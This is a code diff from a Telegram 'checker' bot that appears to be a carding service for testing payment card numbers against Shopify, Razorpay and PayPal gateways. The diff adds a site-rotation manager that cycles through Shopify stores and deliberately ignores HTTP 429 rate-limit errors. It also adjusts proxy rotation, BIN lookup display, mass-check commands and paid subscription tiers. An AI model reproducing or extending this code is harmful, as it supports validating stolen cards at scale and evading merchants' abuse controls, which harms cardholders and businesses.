+        self.cache_time = 0
+        self.cache_ttl = 30  # Refresh cache every 30 seconds
+        
+        # Track last used site type for alternating
+        self.last_used_type = None
+        
+        # Simple error tracking (just for logging, not for removal)
+        self.site_errors = {}  # site -> error_count (for logging only)
+        
+        print("🔄 Site Rotation Manager initialized (NO COOLDOWN)")
+        print("📋 Rotation: GOOD sites (lowest price first) -> Normal sites -> Repeat")
+        print("⚠️ Sites are NEVER skipped due to 429 errors")
+    
+    def _get_good_sites(self) -> List[str]:
+        """Get all GOOD sites sorted by price (lowest first)"""
+        now = time.time()
+        
+        # Check cache
+        if self.good_sites_cache and (now - self.cache_time) < self.cache_ttl:
+            return self.good_sites_cache
+        
+        # Get GOOD sites from site_quality_tracker
+        good_sites = site_quality_tracker.get_good_sites_sorted_by_price()
+        
+        # Also check if any site is marked as GOOD by the tracker
+        for site in autosopi_site_manager.sites:
+            if site_quality_tracker.is_good_site(site):
+                if site not in good_sites:
+                    price = site_quality_tracker.get_site_price(site)
+                    good_sites.append((site, price))
+        
+        # Sort by price (lowest first)
+        good_sites_with_prices = []
+        for site in good_sites:
+            if isinstance(site, tuple):
+                good_sites_with_prices.append(site)
+            else:
+                price = site_quality_tracker.get_site_price(site)
+                good_sites_with_prices.append((site, price))
+        
+        good_sites_with_prices.sort(key=lambda x: x[1])
+        self.good_sites_cache = [site for site, _ in good_sites_with_prices]
+        self.cache_time = now
+        
+        return self.good_sites_cache
+    
+    def _get_normal_sites(self) -> List[str]:
+        """Get all normal sites (not GOOD)"""
+        # Get all sites from autosopi_site_manager
+        all_sites = autosopi_site_manager.sites.copy()
+        
+        # Get GOOD sites
+        good_sites = set(self._get_good_sites())
+        
+        # Normal sites = all sites - GOOD sites
+        self.normal_sites_cache = [s for s in all_sites if s not in good_sites]
+        
+        return self.normal_sites_cache
+    
+    def get_next_site(self) -> Optional[str]:
+        """
+        Get next site with PURE ROUND-ROBIN rotation.
+        NO COOLDOWN - sites are NEVER skipped.
+        
+        Rotation order:
+        1. GOOD site (cheapest first)
+        2. GOOD site (next cheapest) 
+        3. ... until all GOOD sites used
+        4. Normal site
+        5. Normal site
+        6. ... until all normal sites used
+        7. Repeat from step 1
+        """
+        # Refresh site lists
+        good_sites = self._get_good_sites()
+        normal_sites = self._get_normal_sites()
+        
+        # If no sites available, return None
+        if not good_sites and not normal_sites:
+            print("⚠️ No sites available in rotation")
+            return None
+        
+        # ============ ALTERNATING ROTATION ============
+        # Try to alternate between GOOD and normal sites
+        if good_sites and normal_sites:
+            # If last used was GOOD, use normal next
+            if self.last_used_type == "good":
+                site = self._get_next_normal_site(normal_sites)
+                if site:
+                    self.last_used_type = "normal"
+                    print(f"📌 [Site Rotation] Normal site: {site}")
+                    return site
+            
+            # Use GOOD site next
+            site = self._get_next_good_site(good_sites)
+            if site:
+                self.last_used_type = "good"
+                print(f"🌟 [Site Rotation] GOOD site: {site}")
+                return site
+            
+            # If no GOOD site available, try normal
+            site = self._get_next_normal_site(normal_sites)
+            if site:
+                self.last_used_type = "normal"
+                print(f"📌 [Site Rotation] Normal site: {site}")
+                return site
+            
+        elif good_sites:
+            # Only GOOD sites available
+            site = self._get_next_good_site(good_sites)
+            if site:
+                self.last_used_type = "good"
+                print(f"🌟 [Site Rotation] GOOD site: {site}")
+                return site
+            
+        elif normal_sites:
+            # Only normal sites available
+            site = self._get_next_normal_site(normal_sites)
+            if site:
+                self.last_used_type = "normal"
+                print(f"📌 [Site Rotation] Normal site: {site}")
+                return site
+        
+        # If we get here, no sites available
+        return None
+    
+    def _get_next_good_site(self, good_sites: List[str]) -> Optional[str]:
+        """Get next GOOD site in round-robin (cheapest first)"""
+        if not good_sites:
+            return None
+        
+        if self.good_sites_index >= len(good_sites):
+            self.good_sites_index = 0
+        
+        site = good_sites[self.good_sites_index]
+        self.good_sites_index += 1
+        
+        return site
+    
+    def _get_next_normal_site(self, normal_sites: List[str]) -> Optional[str]:
+        """Get next normal site in round-robin"""
+        if not normal_sites:
+            return None
+        
+        if self.normal_sites_index >= len(normal_sites):
+            self.normal_sites_index = 0
+        
+        site = normal_sites[self.normal_sites_index]
+        self.normal_sites_index += 1
+        
+        return site
+    
+    def get_next_good_site_only(self) -> Optional[str]:
+        """Get next GOOD site only (for debugging)"""
+        good_sites = self._get_good_sites()
+        return self._get_next_good_site(good_sites)
+    
+    def get_next_normal_site_only(self) -> Optional[str]:
+        """Get next normal site only (for debugging)"""
+        normal_sites = self._get_normal_sites()
+        return self._get_next_normal_site(normal_sites)
+    
+    def record_site_result(self, site: str, success: bool, response_text: str = ""):
+        """
+        Record site result for tracking (NO COOLDOWN - just logging)
+        Sites are NEVER removed due to errors.
+        """
+        if site not in self.site_errors:
+            self.site_errors[site] = 0
+        
+        if success:
+            self.site_errors[site] = max(0, self.site_errors[site] - 1)
+            # Refresh cache to reflect any new GOOD sites
+            if site_quality_tracker.is_good_site(site):
+                self.cache_time = 0
+        else:
+            self.site_errors[site] += 1
+            # Only log, never remove
+            if self.site_errors[site] >= 5:
+                print(f"⚠️ [Site Warning] {site} has {self.site_errors[site]} errors (NOT removed)")
+    
+    def get_stats(self) -> str:
+        """Get site rotation statistics"""
+        good_sites = self._get_good_sites()
+        normal_sites = self._get_normal_sites()
+        
+        msg = "🔄 <b>Site Rotation Status</b>\n\n"
+        msg += f"📊 GOOD sites: {len(good_sites)}\n"
+        msg += f"📊 Normal sites: {len(normal_sites)}\n"
+        msg += f"📊 Total sites: {len(good_sites) + len(normal_sites)}\n"
+        msg += f"📌 GOOD index: {self.good_sites_index}/{len(good_sites)}\n"
+        msg += f"📌 Normal index: {self.normal_sites_index}/{len(normal_sites)}\n"
+        msg += f"🔄 Last used: {self.last_used_type or 'None'}\n\n"
+        
+        # Show next few sites
+        if good_sites:
+            next_good = []
+            for i in range(min(3, len(good_sites))):
+                idx = (self.good_sites_index + i) % len(good_sites)
+                next_good.append(good_sites[idx])
+            
+            msg += f"🌟 <b>Next GOOD sites:</b>\n"
+            for site in next_good:
+                price = site_quality_tracker.get_site_price(site)
+                msg += f"  • {site} (${price:.2f})\n"
+        
+        if normal_sites:
+            next_normal = []
+            for i in range(min(3, len(normal_sites))):
+                idx = (self.normal_sites_index + i) % len(normal_sites)
+                next_normal.append(normal_sites[idx])
+            
+            msg += f"\n📌 <b>Next Normal sites:</b>\n"
+            for site in next_normal:
+                msg += f"  • {site}\n"
+        
+        msg += f"\n<i>⚠️ Sites are NEVER skipped due to 429 errors - pure round-robin!</i>"
+        
+        return msg
+    
+    def reset_rotation(self):
+        """Reset all rotation indices"""
+        self.good_sites_index = 0
+        self.normal_sites_index = 0
+        self.last_used_type = None
+        self.cache_time = 0
+        print("🔄 Site rotation reset")
+    
+    def get_current_position(self) -> dict:
+        """Get current rotation position"""
+        good_sites = self._get_good_sites()
+        normal_sites = self._get_normal_sites()
+        
+        return {
+            'good_index': self.good_sites_index,
+            'good_total': len(good_sites),
+            'normal_index': self.normal_sites_index,
+            'normal_total': len(normal_sites),
+            'last_used_type': self.last_used_type,
+            'next_good': good_sites[self.good_sites_index % len(good_sites)] if good_sites else None,
+            'next_normal': normal_sites[self.normal_sites_index % len(normal_sites)] if normal_sites else None
+        }
+
+
+# Create global instance
+site_rotation_manager = SiteRotationManager()
 
 # ============ GLOBAL PROXY POOL SYSTEM ============
 # Add this to your f13.py
@@ -21339,6 +21466,8 @@ async def get_proxy_async(user_id: int, gateway: str = 'default') -> Optional[st
     Async version - get proxy for a user with rotation
     """
     return get_proxy_for_user(user_id, gateway)
+
+
 
 
 # ============ GLOBAL PROXY COMMANDS ============
@@ -44928,7 +45057,7 @@ async def hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     PREMIUM_EMOJI_IDS = {
         "skull": "5042167377869932162",
-        "target": "5256131095094652290",
+        "target": "5377336227533969892",
         "toy": "5249244862359812334",
         "diamond": "5427168083074628963",
         "flower": "6230927657257668107",
@@ -52456,7 +52585,7 @@ def get_flag_emoji_from_country(country: str) -> str:
 # Premium emoji IDs (use your existing ones from the code)
 PREMIUM_EMOJI_IDS_BIN = {
     "diamond": "5427168083074628963",
-    "target": "5256131095094652290",
+    "target": "5377336227533969892",
     "skull": "5042167377869932162",
     "credit": "5368324170671202286",  # Replace with your actual credit card emoji ID
     "bank_emoji": "5041796412954641308",  # Replace with your actual bank emoji ID
@@ -53275,12 +53404,46 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     tier = stats['tier']
     
+    
+    PREMIUM_EMOJI_IDS = {
+            "diamond": "5427168083074628963",  # 💎
+            "fire": "5471133374264684999",      # 🔥
+            "skull": "5042167377869932162",      # 💀
+            "target": "5377336227533969892",     # 🎯
+            "alien": "5869573060030683138",      # 👾
+            "money": "6002386288612653951",      # 🙈
+            "smile": "6230927657257668107",      # 😁
+            "devil": "6268012745776588577",  # 😈
+            "bin" : "6237654950432742406",
+            "approved" : "6267264360482084046",
+            "users" : "5784914081165087232",
+            "card" : "5465465194056525619",
+        }
+    
+    # ============ PREMIUM EMOJIS ============
+    status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✔️")
+    id_emoji = premium_emoji(PREMIUM_EMOJI_IDS["bin"], "🆔")
+    user_emoji = premium_emoji(PREMIUM_EMOJI_IDS["users"], "👤")
+    name_emoji = premium_emoji(PREMIUM_EMOJI_IDS["card"], "📛")
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")
+    skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+    target_emoji = premium_emoji(PREMIUM_EMOJI_IDS["target"], "🎯")
+    
+    # Tier emoji mapping
+    tier_emojis = {
+        "free": "🆓",
+        "premium": "🔥",
+        "ultimate": "😈",
+        "admin": "💀"
+    }
+    tier_emoji = tier_emojis.get(tier, "🆓")
+    
     caption = (
-        f"BLADESARKS(CHECKER)\n"
-        f"★ Status : Active ✔\n\n"
-        f"★ ID ✉️ <code>{user.id}</code>\n"
-        f"★ User ✉️ {user.username or 'None'}\n"
-        f"★ Name ✉️ {user.first_name} [{tier.upper()}]\n"
+        f" {status_emoji} <b>Status</b> ➛ Active {status_emoji}\n\n"
+        f" {id_emoji} <b>ID</b> ➛ <code>{user.id}</code>\n"
+        f" {user_emoji} <b>User</b> ➛ @{user.username or 'None'}\n"
+        f" {name_emoji} <b>Name</b> ➛ {user.first_name} [{tier_emoji} {tier.upper()}]\n"
+        f" {diamond_emoji} <b>Dev</b> ➛ @lencax"
     )
     
     # Create keyboard with gateways in rows (2 per row)
@@ -53292,8 +53455,11 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [
             InlineKeyboardButton("💰 Razorpay", callback_data='gateway_razorpay'),
             InlineKeyboardButton("💸 PayPal", callback_data='gateway_paypal')
+        ],
+        [
+            InlineKeyboardButton("🆓 Free Credits", callback_data='free_credits'),
+            InlineKeyboardButton("💎 Upgrade", callback_data='buy_premium')
         ]
-
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -53312,7 +53478,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup
         )
         
-        
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user = update.effective_user
@@ -53327,7 +53492,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "✅ <b>Gateway: Shopify</b>\n\n"
             "Commands:\n"
             "/sh - Single check\n"
-            "/aumc - Mass check"
+            "/msh - Mass check"
         )
         
         keyboard = [
